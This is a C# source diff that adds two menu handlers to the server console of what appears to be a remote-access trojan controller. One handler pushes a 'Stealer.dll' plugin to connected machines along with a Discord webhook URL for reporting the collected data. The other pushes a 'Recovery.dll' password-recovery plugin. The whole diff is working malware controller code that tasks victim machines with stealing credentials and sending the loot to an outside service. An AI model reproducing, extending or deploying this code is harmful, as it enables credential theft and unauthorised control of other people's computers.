@@ -2372,5 +2372,80 @@ namespace Server
                 return;
             }
         }
+
+        private void fetchingDataToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack packet = new MsgPack();
+                packet.ForcePathObject("Pac_ket").AsString = "report";
+                packet.ForcePathObject("discordurl").AsString = Properties.Settings.Default.DiscordUrl;
+
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Stealer.dll"));
+                msgpack.ForcePathObject("Msgpack").SetAsBytes(packet.Encode2Bytes());
+
+                ListViewItem lv = new ListViewItem();
+                lv.Text = "Fetching Data: ";
+                lv.SubItems.Add("0");
+                lv.ToolTipText = Guid.NewGuid().ToString();
+
+                if (listView4.Items.Count > 0)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                    {
+                        if (item.Text == lv.Text)
+                        {
+                            return;
+                        }
+                    }
+                }
+
+                Program.form1.listView4.Items.Add(lv);
+                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
+            }
+            catch (Exception)
+            {
+
+            }
+        }
+
+        private void passwordRecoveryToolStripMenuItem1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Pac_ket").AsString = "plu_gin";
+                msgpack.ForcePathObject("Dll").AsString = (GetHash.GetChecksum(@"Plugins\Recovery.dll"));
+
+                ListViewItem lv = new ListViewItem();
+                lv.Text = "Password Recovery: ";
+                lv.SubItems.Add("0");
+                lv.ToolTipText = Guid.NewGuid().ToString();
+
+                if (listView4.Items.Count > 0)
+                {
+                    foreach (ListViewItem item in listView4.Items)
+                    {
+                        if (item.Text == lv.Text)
+                        {
+                            return;
+                        }
+                    }
+                }
+
+                Program.form1.listView4.Items.Add(lv);
+                Program.form1.listView4.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize);
+
+                getTasks.Add(new AsyncTask(msgpack.Encode2Bytes(), lv.ToolTipText, false));
+            }
+            catch (Exception)
+            {
+
+            }
+        }
     }
 }
